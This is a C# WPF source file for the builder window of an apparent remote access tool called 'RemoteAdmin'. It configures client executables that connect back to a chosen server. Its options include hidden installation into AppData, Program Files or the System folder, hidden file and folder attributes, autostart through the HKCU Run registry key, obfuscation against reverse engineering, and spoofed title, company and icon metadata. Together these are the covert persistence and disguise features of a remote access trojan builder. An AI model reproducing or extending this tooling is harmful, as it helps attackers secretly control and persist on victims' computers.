using System;
using System.IO;
using System.Windows;
using System.Windows.Controls;
using Microsoft.Win32;
using RemoteAdmin.Server.Build;

namespace RemoteAdmin.Server
{
    public partial class BuilderWindow : Window
    {
        // Persistent configuration across tabs
        private string serverIP = "127.0.0.1";
        private string serverPort = "5900";
        private string reconnectDelay = "30";
        private bool obfuscate = false;

        // Installation settings
        private bool installClient = true;
        private string installLocation = "AppData"; // AppData, ProgramFiles, or System
        private string installSubDirectory = "SubDir";
        private string installName = "Client";
        private bool setFileHidden = false;
        private bool setSubDirHidden = false;
        private bool runOnStartup = true;
        private string startupName = "Client";

        // Assembly settings
        private string assemblyTitle = "Client Application";
        private string assemblyCompany = "Company Name";
        private string iconPath = "";

        // BuilderWindow fields
        private string clientPfxPassword = "";
        private TextBox txtClientPfxPassword;


        // Current UI references
        private TextBox txtServerIP, txtServerPort, txtReconnectDelay;
        private CheckBox chkObfuscate;

        // Installation UI references
        private CheckBox chkInstallClient, chkSetFileHidden, chkSetSubDirHidden, chkRunOnStartup;
        private RadioButton rbAppData, rbProgramFiles, rbSystem;
        private TextBox txtInstallSubDir, txtInstallName, txtStartupName;

        // Assembly UI references
        private TextBox txtAssemblyTitle, txtAssemblyCompany, txtIconPath;

        public BuilderWindow()
        {
            InitializeComponent();
            // Load the tab that's selected in XAML (Basic Settings)
            LoadBasicSettings();
        }

        private void SidebarButton_Click(object sender, RoutedEventArgs e)
        {
            // Save current tab data before switching
            SaveCurrentTab();

            // Clear all selected states
            if (btnBasicSettings != null) btnBasicSettings.Tag = null;
            if (btnConnectionSettings != null) btnConnectionSettings.Tag = null;
            if (btnInstallationSettings != null) btnInstallationSettings.Tag = null;
            if (btnAssemblySettings != null) btnAssemblySettings.Tag = null;

            var button = sender as Button;
            if (button != null) button.Tag = "Selected";

            // Load the appropriate settings page
            if (button == btnBasicSettings) LoadBasicSettings();
            else if (button == btnConnectionSettings) LoadConnectionSettings();
            else if (button == btnInstallationSettings) LoadInstallationSettings();
            else if (button == btnAssemblySettings) LoadAssemblySettings();
        }

        private void SaveCurrentTab()
        {
            // Save Connection Settings
            if (txtServerIP != null) serverIP = txtServerIP.Text;
            if (txtServerPort != null) serverPort = txtServerPort.Text;
            if (txtReconnectDelay != null) reconnectDelay = txtReconnectDelay.Text;
            if (chkObfuscate != null) obfuscate = chkObfuscate.IsChecked ?? false;

            // Save Installation Settings
            if (chkInstallClient != null) installClient = chkInstallClient.IsChecked ?? true;
            if (rbAppData != null && rbAppData.IsChecked == true) installLocation = "AppData";
            if (rbProgramFiles != null && rbProgramFiles.IsChecked == true) installLocation = "ProgramFiles";
            if (rbSystem != null && rbSystem.IsChecked == true) installLocation = "System";
            if (txtInstallSubDir != null) installSubDirectory = txtInstallSubDir.Text;
            if (txtInstallName != null) installName = txtInstallName.Text;
            if (chkSetFileHidden != null) setFileHidden = chkSetFileHidden.IsChecked ?? false;
            if (chkSetSubDirHidden != null) setSubDirHidden = chkSetSubDirHidden.IsChecked ?? false;
            if (chkRunOnStartup != null) runOnStartup = chkRunOnStartup.IsChecked ?? true;
            if (txtStartupName != null) startupName = txtStartupName.Text;

            // Save Assembly Settings
            if (txtAssemblyTitle != null) assemblyTitle = txtAssemblyTitle.Text;
            if (txtAssemblyCompany != null) assemblyCompany = txtAssemblyCompany.Text;
            if (txtIconPath != null) iconPath = txtIconPath.Text;
            if (txtClientPfxPassword != null) clientPfxPassword = txtClientPfxPassword.Text ?? "";
        }

        private void LoadBasicSettings()
        {
            contentArea.Children.Clear();
            var panel = new StackPanel();

            panel.Children.Add(CreateHeader("Basic Settings"));

            var welcomeText = new TextBlock
            {
                Text = "Welcome to the RemoteAdmin Client Builder!\n\n" +
                       "This tool allows you to build custom client executables with your server configuration embedded.\n\n" +
                       "Features:\n" +
                       "• Configure server connection details\n" +
                       "• Customize reconnection behavior\n" +
                       "• Optional code obfuscation\n" +
                       "• Single executable output\n\n" +
                       "Use the sidebar to navigate through different configuration options, then click 'Build Client' when ready.",
                TextWrapping = TextWrapping.Wrap,
                Foreground = System.Windows.Media.Brushes.LightGray,
                FontSize = 12,
                LineHeight = 20
            };
            panel.Children.Add(welcomeText);

            contentArea.Children.Add(panel);
        }

        private void LoadConnectionSettings()
        {
            contentArea.Children.Clear();
            var panel = new StackPanel();

            panel.Children.Add(CreateHeader("Connection Settings"));

            panel.Children.Add(CreateLabel("Server IP Address:"));
            txtServerIP = CreateTextBox(serverIP);
            panel.Children.Add(txtServerIP);
            panel.Children.Add(CreateHint("The IP address or hostname of your server"));
            panel.Children.Add(CreateSpacer());

            panel.Children.Add(CreateLabel("Server Port:"));
            txtServerPort = CreateTextBox(serverPort);
            panel.Children.Add(txtServerPort);
            panel.Children.Add(CreateHint("Port number (1-65535)"));
            panel.Children.Add(CreateSpacer());

            panel.Children.Add(CreateLabel("Reconnect Delay (seconds):"));
            txtReconnectDelay = CreateTextBox(reconnectDelay);
            panel.Children.Add(txtReconnectDelay);
            panel.Children.Add(CreateHint("How long to wait before reconnecting after connection loss"));
            panel.Children.Add(CreateSpacer(20));

            panel.Children.Add(CreateHeader("Advanced Options"));
            chkObfuscate = new CheckBox
            {
                Content = "Enable Code Obfuscation",
                IsChecked = obfuscate,
                Margin = new Thickness(0, 10, 0, 0)
            };
            panel.Children.Add(chkObfuscate);

            panel.Children.Add(CreateSpacer(20));
            panel.Children.Add(CreateHeader("Certificate Options"));

            panel.Children.Add(CreateLabel("Client PFX Password:"));
            txtClientPfxPassword = CreateTextBox(clientPfxPassword); // or use a PasswordBox if preferred
            panel.Children.Add(txtClientPfxPassword);
            panel.Children.Add(CreateHint("Password used to open client.pfx (leave blank if none)"));

            panel.Children.Add(CreateHint("Obfuscation renames classes/methods to make reverse engineering harder"));

            contentArea.Children.Add(panel);
        }

        private void LoadInstallationSettings()
        {
            contentArea.Children.Clear();
            var panel = new StackPanel();

            // Installation Location Section
            panel.Children.Add(CreateHeader("Installation Location"));

            chkInstallClient = new CheckBox
            {
                Content = "Install Client",
                FontWeight = FontWeights.Bold,
                Margin = new Thickness(0, 5, 0, 10)
            };
            chkInstallClient.Checked += (s, e) => UpdateInstallationControls();
            chkInstallClient.Unchecked += (s, e) => UpdateInstallationControls();
            panel.Children.Add(chkInstallClient);

            var installPanel = new StackPanel { Margin = new Thickness(20, 0, 0, 0) };

            // Install Directory
            installPanel.Children.Add(CreateLabel("Install Directory:"));

            rbAppData = new RadioButton
            {
                Content = "User Application Data",
                IsChecked = installLocation == "AppData",
                Margin = new Thickness(0, 10, 0, 5),
                GroupName = "InstallLocation"
            };
            installPanel.Children.Add(rbAppData);

            var appDataPath = new StackPanel { Orientation = Orientation.Horizontal, Margin = new Thickness(20, 0, 0, 5) };
            appDataPath.Children.Add(new TextBlock
            {
                Text = "📁 ",
                VerticalAlignment = VerticalAlignment.Center,
                Margin = new Thickness(0, 0, 5, 0)
            });
            appDataPath.Children.Add(new TextBlock
            {
                Text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Roaming"),
                Foreground = System.Windows.Media.Brushes.Gray,
                FontSize = 10,
                VerticalAlignment = VerticalAlignment.Center
            });
            installPanel.Children.Add(appDataPath);

            rbProgramFiles = new RadioButton
            {
                Content = "Program Files",
                IsChecked = installLocation == "ProgramFiles",
                Margin = new Thickness(0, 5, 0, 5),
                GroupName = "InstallLocation"
            };
            installPanel.Children.Add(rbProgramFiles);

            var programFilesPath = new StackPanel { Orientation = Orientation.Horizontal, Margin = new Thickness(20, 0, 0, 5) };
            programFilesPath.Children.Add(new TextBlock
            {
                Text = "📁 ",
                VerticalAlignment = VerticalAlignment.Center,
                Margin = new Thickness(0, 0, 5, 0)
            });
            programFilesPath.Children.Add(new TextBlock
            {
                Text = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
                Foreground = System.Windows.Media.Brushes.Gray,
                FontSize = 10,
                VerticalAlignment = VerticalAlignment.Center
            });
            installPanel.Children.Add(programFilesPath);

            rbSystem = new RadioButton
            {
                Content = "System",
                IsChecked = installLocation == "System",
                Margin = new Thickness(0, 5, 0, 5),
                GroupName = "InstallLocation"
            };
            installPanel.Children.Add(rbSystem);

            var systemPath = new StackPanel { Orientation = Orientation.Horizontal, Margin = new Thickness(20, 0, 0, 5) };
            systemPath.Children.Add(new TextBlock
            {
                Text = "📁 ",
                VerticalAlignment = VerticalAlignment.Center,
                Margin = new Thickness(0, 0, 5, 0)
            });
            systemPath.Children.Add(new TextBlock
            {
                Text = Environment.GetFolderPath(Environment.SpecialFolder.System),
                Foreground = System.Windows.Media.Brushes.Gray,
                FontSize = 10,
                VerticalAlignment = VerticalAlignment.Center
            });
            installPanel.Children.Add(systemPath);

            installPanel.Children.Add(CreateSpacer(15));

            // Install Subdirectory
            installPanel.Children.Add(CreateLabel("Install Subdirectory:"));
            txtInstallSubDir = CreateTextBox(installSubDirectory);
            txtInstallSubDir.Width = 300;
            txtInstallSubDir.HorizontalAlignment = HorizontalAlignment.Left;
            installPanel.Children.Add(txtInstallSubDir);
            installPanel.Children.Add(CreateSpacer(10));

            // Install Name
            installPanel.Children.Add(CreateLabel("Install Name:"));
            var installNamePanel = new StackPanel { Orientation = Orientation.Horizontal };
            txtInstallName = CreateTextBox(installName);
            txtInstallName.Width = 250;
            installNamePanel.Children.Add(txtInstallName);
            installNamePanel.Children.Add(new TextBlock
            {
                Text = ".exe",
                VerticalAlignment = VerticalAlignment.Center,
                Margin = new Thickness(5, 0, 0, 0),
                Foreground = System.Windows.Media.Brushes.Gray
            });
            installPanel.Children.Add(installNamePanel);
            installPanel.Children.Add(CreateSpacer(10));

            // File attributes
            var attributesPanel = new StackPanel { Orientation = Orientation.Horizontal };
            chkSetFileHidden = new CheckBox
            {
                Content = "Set file attributes to hidden",
                IsChecked = setFileHidden,
                Margin = new Thickness(0, 0, 20, 0)
            };
            attributesPanel.Children.Add(chkSetFileHidden);

            chkSetSubDirHidden = new CheckBox
            {
                Content = "Set subdir attributes to hidden",
                IsChecked = setSubDirHidden
            };
            attributesPanel.Children.Add(chkSetSubDirHidden);
            installPanel.Children.Add(attributesPanel);

            // Installation Location Preview
            installPanel.Children.Add(CreateSpacer(15));
            installPanel.Children.Add(CreateLabel("Installation Location Preview:"));
            var previewBox = new TextBox
            {
                Text = GetInstallationPreview(),
                IsReadOnly = true,
                Background = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(40, 40, 40)),
                Foreground = System.Windows.Media.Brushes.LightGreen,
                FontFamily = new System.Windows.Media.FontFamily("Consolas"),
                Height = 35,
                Padding = new Thickness(8),
                Margin = new Thickness(0, 5, 0, 0)
            };

            // Update preview when any field changes
            Action updatePreview = () => previewBox.Text = GetInstallationPreview();
            rbAppData.Checked += (s, e) => updatePreview();
            rbProgramFiles.Checked += (s, e) => updatePreview();
            rbSystem.Checked += (s, e) => updatePreview();
            txtInstallSubDir.TextChanged += (s, e) => updatePreview();
            txtInstallName.TextChanged += (s, e) => updatePreview();

            installPanel.Children.Add(previewBox);

            panel.Children.Add(installPanel);

            // Autostart Section
            panel.Children.Add(CreateSpacer(20));
            panel.Children.Add(CreateHeader("Autostart"));

            chkRunOnStartup = new CheckBox
            {
                Content = "Run Client when the computer starts",
                IsChecked = runOnStartup,
                FontWeight = FontWeights.Bold,
                Margin = new Thickness(0, 5, 0, 10)
            };
            chkRunOnStartup.Checked += (s, e) => UpdateStartupControls();
            chkRunOnStartup.Unchecked += (s, e) => UpdateStartupControls();
            panel.Children.Add(chkRunOnStartup);

            var startupPanel = new StackPanel { Margin = new Thickness(20, 0, 0, 0) };
            startupPanel.Children.Add(CreateLabel("Startup Name:"));
            txtStartupName = CreateTextBox(startupName);
            txtStartupName.Width = 300;
            txtStartupName.HorizontalAlignment = HorizontalAlignment.Left;
            startupPanel.Children.Add(txtStartupName);
            startupPanel.Children.Add(CreateHint("Registry key name in HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"));

            panel.Children.Add(startupPanel);

            contentArea.Children.Add(panel);

            // Initial state
            UpdateInstallationControls();
            UpdateStartupControls();
        }

        private string GetInstallationPreview()
        {
            string basePath = "";
            if (installLocation == "AppData" || rbAppData?.IsChecked == true)
                basePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            else if (installLocation == "ProgramFiles" || rbProgramFiles?.IsChecked == true)
                basePath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
            else if (installLocation == "System" || rbSystem?.IsChecked == true)
                basePath = Environment.GetFolderPath(Environment.SpecialFolder.System);

            string subDir = txtInstallSubDir?.Text ?? installSubDirectory;
            string fileName = (txtInstallName?.Text ?? installName) + ".exe";

            return Path.Combine(basePath, subDir, fileName);
        }

        private void UpdateInstallationControls()
        {
            bool isEnabled = chkInstallClient?.IsChecked ?? installClient;

            if (rbAppData != null) rbAppData.IsEnabled = isEnabled;
            if (rbProgramFiles != null) rbProgramFiles.IsEnabled = isEnabled;
            if (rbSystem != null) rbSystem.IsEnabled = isEnabled;
            if (txtInstallSubDir != null) txtInstallSubDir.IsEnabled = isEnabled;
            if (txtInstallName != null) txtInstallName.IsEnabled = isEnabled;
            if (chkSetFileHidden != null) chkSetFileHidden.IsEnabled = isEnabled;
            if (chkSetSubDirHidden != null) chkSetSubDirHidden.IsEnabled = isEnabled;
        }

        private void UpdateStartupControls()
        {
            bool isEnabled = chkRunOnStartup?.IsChecked ?? runOnStartup;
            if (txtStartupName != null) txtStartupName.IsEnabled = isEnabled;
        }

        private void LoadAssemblySettings()
        {
            contentArea.Children.Clear();
            var panel = new StackPanel();

            panel.Children.Add(CreateHeader("Assembly Settings"));
            panel.Children.Add(CreateLabel("Customize the appearance and metadata of your client executable."));
            panel.Children.Add(CreateSpacer(20));

            panel.Children.Add(CreateLabel("Assembly Title:"));
            txtAssemblyTitle = CreateTextBox(assemblyTitle);
            panel.Children.Add(txtAssemblyTitle);
            panel.Children.Add(CreateHint("Application name shown in Task Manager"));
            panel.Children.Add(CreateSpacer());

            panel.Children.Add(CreateLabel("Company Name:"));
            txtAssemblyCompany = CreateTextBox(assemblyCompany);
            panel.Children.Add(txtAssemblyCompany);
            panel.Children.Add(CreateHint("Company name in file properties"));
            panel.Children.Add(CreateSpacer());

            panel.Children.Add(CreateLabel("Custom Icon (Optional):"));
            var iconPanel = new StackPanel { Orientation = Orientation.Horizontal };
            txtIconPath = CreateTextBox(iconPath);
            txtIconPath.Width = 300;
            iconPanel.Children.Add(txtIconPath);

            var btnBrowse = new Button
            {
                Content = "Browse...",
                Width = 80,
                Height = 25,
                Margin = new Thickness(10, 0, 0, 0),
                Background = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(51, 51, 55)),
                Foreground = System.Windows.Media.Brushes.White,
                BorderThickness = new Thickness(0)
            };
            btnBrowse.Click += BrowseIcon_Click;
            iconPanel.Children.Add(btnBrowse);

            panel.Children.Add(iconPanel);
            panel.Children.Add(CreateHint("Select a .ico file to use as the executable icon"));

            panel.Children.Add(CreateSpacer(20));
            var noteText = new TextBlock
            {
                Text = "Note: Icon and metadata customization will be fully implemented in a future version.",
                TextWrapping = TextWrapping.Wrap,
                Foreground = System.Windows.Media.Brushes.Orange,
                FontSize = 11,
                FontStyle = FontStyles.Italic
            };
            panel.Children.Add(noteText);

            contentArea.Children.Add(panel);
        }

        private void BrowseIcon_Click(object sender, RoutedEventArgs e)
        {
            var openDialog = new OpenFileDialog
            {
                Filter = "Icon Files (*.ico)|*.ico",
                Title = "Select Icon File"
            };

            if (openDialog.ShowDialog() == true)
            {
                txtIconPath.Text = openDialog.FileName;
                iconPath = openDialog.FileName;
            }
        }

        private async void BuildClient_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                // Save current tab before building
                SaveCurrentTab();

                // Validate inputs
                if (string.IsNullOrWhiteSpace(serverIP))
                {
                    MessageBox.Show("Please enter a server IP address.", "Validation Error",
                        MessageBoxButton.OK, MessageBoxImage.Warning);
                    return;
                }

                if (!int.TryParse(serverPort, out int port) || port < 1 || port > 65535)
                {
                    MessageBox.Show("Please enter a valid port (1-65535).", "Validation Error",
                        MessageBoxButton.OK, MessageBoxImage.Warning);
                    return;
                }

                if (!int.TryParse(reconnectDelay, out int delay) || delay < 1)
                {
                    MessageBox.Show("Please enter a valid reconnect delay (minimum 1 second).", "Validation Error",
                        MessageBoxButton.OK, MessageBoxImage.Warning);
                    return;
                }

                // Find the client template
                string templatePath = FindClientTemplate();
                if (templatePath == null)
                {
                    MessageBox.Show(
                        "Client template not found!\n\n" +
                        "Please build the RemoteAdmin.Client project first:\n\n" +
                        "1. Right-click RemoteAdmin.Client in Solution Explorer\n" +
                        "2. Select 'Publish'\n" +
                        "3. Publish as single-file executable\n" +
                        "4. Copy the published EXE to the template folder\n" +
                        "5. Try building again\n\n" +
                        "The builder looks for:\n" +
                        "  • template\\RemoteAdmin.Client.exe\n" +
                        "  • RemoteAdmin.Client.exe\n" +
                        "  • client-template.exe",
                        "Template Not Found",
                        MessageBoxButton.OK,
                        MessageBoxImage.Warning);
                    return;
                }

                var saveDialog = new SaveFileDialog
                {
                    Filter = "Executable|*.exe",
                    FileName = "RemoteAdmin-Client.exe",
                    Title = "Save Built Client"
                };

                if (saveDialog.ShowDialog() != true)
                    return;

                // Create build options
                var options = new BuildOptions
                {
                    ServerIP = serverIP.Trim(),
                    ServerPort = port,
                    ReconnectDelay = delay,
                    Obfuscate = obfuscate,

                    // Installation settings
                    InstallClient = installClient,
                    InstallLocation = installLocation,
                    InstallSubDirectory = installSubDirectory,
                    InstallName = installName,
                    SetFileHidden = setFileHidden,
                    SetSubDirHidden = setSubDirHidden,

                    // Startup settings
                    InstallOnStartup = runOnStartup,
                    StartupName = startupName,

                    // Assembly settings
                    AssemblyTitle = assemblyTitle,
                    AssemblyCompany = assemblyCompany,
                    IconPath = iconPath,

                    OutputPath = saveDialog.FileName,
                    ClientPfxPassword = clientPfxPassword
                };

                // Show progress window
                var progressWindow = new Window
                {
                    Title = "Building Client",
                    Width = 450,
                    Height = 180,
                    WindowStartupLocation = WindowStartupLocation.CenterOwner,
                    Owner = this,
                    ResizeMode = ResizeMode.NoResize,
                    Background = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(30, 30, 30))
                };

                var progressPanel = new StackPanel
                {
                    VerticalAlignment = VerticalAlignment.Center,
                    HorizontalAlignment = HorizontalAlignment.Center
                };

                var progressText = new TextBlock
                {
                    Text = "Building client, please wait...",
                    Foreground = System.Windows.Media.Brushes.White,
                    FontSize = 14,
                    TextAlignment = TextAlignment.Center,
                    Margin = new Thickness(20)
                };

                var progressBar = new ProgressBar
                {
                    Width = 350,
                    Height = 20,
                    IsIndeterminate = true
                };

                progressPanel.Children.Add(progressText);
                progressPanel.Children.Add(progressBar);
                progressWindow.Content = progressPanel;

                progressWindow.Show();

                try
                {
                    // Build in background
                    await Task.Run(() =>
                    {
                        var builder = new ClientBuilder(options, templatePath);
                        builder.Build();
                    });

                    progressWindow.Close();

                    MessageBox.Show(
                        $"✓ Client built successfully!\n\n" +
                        $"Output: {Path.GetFileName(saveDialog.FileName)}\n" +
                        $"Location: {Path.GetDirectoryName(saveDialog.FileName)}\n\n" +
                        $"Configuration:\n" +
                        $"  • Server: {options.ServerIP}:{options.ServerPort}\n" +
                        $"  • Reconnect Delay: {options.ReconnectDelay}s\n" +
                        $"  • Obfuscation: {(options.Obfuscate ? "Enabled" : "Disabled")}\n\n" +
                        $"The executable is ready to use!\n" +
                        $"Simply copy and run it - no additional files needed.",
                        "Build Successful",
                        MessageBoxButton.OK,
                        MessageBoxImage.Information);

                    DialogResult = true;
                }
                catch (Exception ex)
                {
                    progressWindow.Close();
                    throw;
                }
            }
            catch (Exception ex)
            {
                string errorMessage = $"Build failed!\n\n" +
                    $"Error: {ex.Message}\n\n";

                if (ex.InnerException != null)
                {
                    errorMessage += $"Details: {ex.InnerException.Message}\n\n";
                }

                MessageBox.Show(errorMessage, "Build Error",
                    MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        private string FindClientTemplate()
        {
            string baseDir = AppDomain.CurrentDomain.BaseDirectory;

            string[] possiblePaths = new[]
            {
                Path.Combine(baseDir, "template", "Client.exe"),
            };

            foreach (var path in possiblePaths)
            {
                try
                {
                    string fullPath = Path.GetFullPath(path);
                    if (File.Exists(fullPath))
                    {
                        return fullPath;
                    }
                }
                catch { }
            }

            return null;
        }

        private void Cancel_Click(object sender, RoutedEventArgs e)
        {
            DialogResult = false;
        }

        // Helper methods to create UI elements
        private TextBlock CreateHeader(string text)
        {
            return new TextBlock
            {
                Text = text,
                FontSize = 18,
                FontWeight = FontWeights.Bold,
                Margin = new Thickness(0, 0, 0, 15),
                Foreground = System.Windows.Media.Brushes.White
            };
        }

        private TextBlock CreateLabel(string text)
        {
            return new TextBlock
            {
                Text = text,
                Margin = new Thickness(0, 0, 0, 5),
                FontSize = 12,
                Foreground = System.Windows.Media.Brushes.LightGray
            };
        }

        private TextBox CreateTextBox(string defaultValue)
        {
            return new TextBox
            {
                Text = defaultValue,
                Margin = new Thickness(0, 0, 0, 0),
                Padding = new Thickness(8, 5, 8, 5),
                FontSize = 12
            };
        }

        private TextBlock CreateHint(string text)
        {
            return new TextBlock
            {
                Text = text,
                FontSize = 10,
                Foreground = System.Windows.Media.Brushes.Gray,
                Margin = new Thickness(0, 3, 0, 0),
                TextWrapping = TextWrapping.Wrap
            };
        }

        private FrameworkElement CreateSpacer(int height = 15)
        {
            return new Border { Height = height };
        }
    }
}